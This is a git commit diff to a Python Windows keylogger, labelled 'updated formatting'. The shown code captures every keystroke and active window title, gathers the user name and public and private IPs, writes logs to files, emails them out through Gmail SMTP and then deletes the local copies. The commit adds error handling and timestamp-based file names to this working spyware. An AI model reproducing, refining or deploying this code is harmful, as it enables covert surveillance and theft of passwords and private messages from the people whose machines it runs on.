3e84435f3b277a02bb78b34765a7a581ae8f999d
Souvik Chatterjee <55107082+codassassin@users.noreply.github.com>
2021-08-19 21:27:34 +0530

    updated formatting

--- keylogger.py
+++ keylogger.py
@@ -12,11 +12,14 @@ from email.mime.base import MIMEBase
 from email import encoders
 import threading
 import config
+import datetime
+import sys
 
 
 class keylog:
     def __init__(self):
         self.dateTime = time.ctime(time.time())
+        self.timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
         self.user = os.path.expanduser('~').split('\\')[2]
         self.publicIP = requests.get('https://api.ipify.org').text
         self.privateIP = socket.gethostbyname(socket.gethostname())
@@ -36,62 +39,71 @@ class keylog:
         self.toAddr = self.fromAddr
 
     def onPress(self, key):
-        self.newApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        try:
+            self.newApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
-        if self.newApp == 'Cortana':
-            self.newApp = 'Windows Start Menu'
-        else:
-            pass
+            if self.newApp == 'Cortana':
+                self.newApp = 'Windows Start Menu'
+            else:
+                pass
 
-        if self.newApp != self.oldApp and self.newApp != '':
-            self.loggedData.append(f'[{self.dateTime}] ~ {self.newApp}\n')
-            self.oldApp = self.newApp
-        else:
-            pass
+            if self.newApp != self.oldApp and self.newApp != '':
+                self.loggedData.append(f'[{self.dateTime}] ~ {self.newApp}\n')
+                self.oldApp = self.newApp
+            else:
+                pass
 
-        substitution = {
-            'Key.enter': '[ENTER]\n',
-            'Key.backspace': '[BACKSPACE]',
-            'Key.space': ' ',
-            'Key.alt_l': '[ALT]',
-            'Key.tab': '[TAB]',
-            'Key.delete': '[DEL]',
-            'Key.ctrl_l': '[CTRL]',
-            'Key.left': '[LEFT ARROW]',
-            'Key.right': '[RIGHT ARROW]',
-            'Key.shift': '[SHIFT]',
-            '\\x13': '[CTRL+S]',
-            '\\x17': '[CTRL+W]',
-            'Key.caps_lock': '[CAPS LK]',
-            '\\x01': '[CTRL+A]',
-            'Key.cmd': '[WINDOWS KEY]',
-            'Key.print_screen': '[PRT SCR]',
-            '\\x03': '[CTRL+C]',
-            '\\x16': '[CTRL+V]'
-        }
+            substitution = {
+                'Key.enter': '[ENTER]\n',
+                'Key.backspace': '[BACKSPACE]',
+                'Key.space': ' ',
+                'Key.alt_l': '[ALT]',
+                'Key.tab': '[TAB]',
+                'Key.delete': '[DEL]',
+                'Key.ctrl_l': '[CTRL]',
+                'Key.left': '[LEFT ARROW]',
+                'Key.right': '[RIGHT ARROW]',
+                'Key.shift': '[SHIFT]',
+                '\\x13': '[CTRL+S]',
+                '\\x17': '[CTRL+W]',
+                'Key.caps_lock': '[CAPS LK]',
+                '\\x01': '[CTRL+A]',
+                'Key.cmd': '[WINDOWS KEY]',
+                'Key.print_screen': '[PRT SCR]',
+                '\\x03': '[CTRL+C]',
+                '\\x16': '[CTRL+V]'
+            }
 
-        key = str(key).strip('\'')
-        if key in substitution:
-            self.loggedData.append(substitution[key])
-        else:
-            self.loggedData.append(key)
+            key = str(key).strip('\'')
+            if key in substitution:
+                self.loggedData.append(substitution[key])
+            else:
+                self.loggedData.append(key)
+
+        except Exception as e:
+            print(f'[-] ERROR: {e}')
+            sys.exit(0)
 
     def writeFile(self, count):
-        pathList = [self.one, self.two]
+        try:
+            pathList = [self.one]
 
-        filePath = random.choice(pathList)
-        fileName = str(count) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
-        file = filePath + fileName
-        print(file)
-        self.deleteFile.append(file)
+            filePath = random.choice(pathList)
+            fileName = f'{str(count)}I{str(self.timestamp)}.txt'
+            file = filePath + fileName
+            print(file)
+            self.deleteFile.append(file)
 
-        with open(file, 'w') as fp:
-            fp.write(''.join(self.loggedData))
-        print('written all data')
+            with open(file, 'w') as fp:
+                fp.write(''.join(self.loggedData))
+            print('[+] WRITTEN ALL DATA')
+
+        except Exception as e:
+            print(f'[-] ERROR WRITING TO FILE: {e}')
+            sys.exit(0)
 
     def sendLogs(self):
         count = 0
-
         time.sleep(600)
         while True:
             if len(self.loggedData) > 1:
@@ -108,7 +120,7 @@ class keylog:
                     msg.attach(MIMEText(body, 'plain'))
 
                     attachment = open(self.deleteFile[0], 'rb')
-                    print('attachment')
+                    print('[+] ATTACHMENT')
 
                     fileName = self.deleteFile[0].split('/')[2]
 
@@ -119,29 +131,28 @@ class keylog:
                     msg.attach(part)
 
                     text = msg.as_string()
-                    print('test msg.as_string')
+                    print('[+] TEST msg.as_string')
 
                     s = smtplib.SMTP('smtp.gmail.com', 587)
                     s.ehlo()
                     s.starttls()
-                    print('starttls')
+                    print('[+] STARTTLS')
                     s.ehlo()
                     s.login(self.fromAddr, self.fromPswd)
                     s.sendmail(self.fromAddr, self.toAddr, text)
-                    print('sent mail')
+                    print('[+] SENT MAIL')
                     attachment.close()
                     s.close()
 
                     os.remove(self.deleteFile[0])
                     del self.loggedData[1:]
                     del self.deleteFile[0:]
-                    print('delete data/files')
-
+                    print('[+] DELETED DATA/FILES')
                     count += 1
 
                 except Exception as e:
-                    print('[!] sendLogs // Error.. ~ %s' % e)
-                    pass
+                    print(f'[-] ERROR SENDING FILES: {e}')
+                    sys.exit(0)
 
 
 if __name__ == '__main__':
